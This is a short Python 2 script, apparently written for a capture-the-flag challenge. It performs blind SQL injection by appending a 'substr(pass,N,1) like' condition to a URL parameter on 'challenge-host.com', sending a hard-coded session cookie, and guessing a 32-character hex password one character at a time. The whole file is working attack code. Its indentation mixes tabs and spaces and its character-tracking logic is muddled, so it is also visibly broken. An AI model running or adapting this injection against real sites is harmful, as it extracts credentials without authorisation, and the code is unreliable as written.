#!/usr/bin/python

from stripogram import *
import urllib2
import os

dic = '0123456789abcdef'

opener = urllib2.build_opener()
opener.addheaders.append(('Cookie', 'PHPSESSID=q5ivj26apcvbb4hv8oe3leuaa5'))

enable = []
passwd = []
count = 0

for x in xrange(0,32):
	count += 1
	print "First loop (x):" + str(x)

  for i in xrange(0,len(dic)):
		print "Second loop (i):" + str(i)
		#os.system('clear')
		enable.append(dic[i])
		print "Enable:"
		print enable
		injection = ''.join(enable)
		#print injection
    
		url = "http://challenge-host.com/?id=6&uid=1"+"%20"+"and"+"%20"+"substr(pass," + str(count) + ",1)%20"+"like"+"%20"+"%22" + dic[i] + "%22"
		print url
		print "[+] Injection : " + " %s" %injection
		
    f = opener.open(url).read()
		#print f
		text = html2text(f).split('\n')[33].split(' ')[-1]
		print text

    if text == 'admin':
			passwd.append(enable[0])
			break
		else:
			print "del: " + str(x)
			#print enable
			del enable[x]

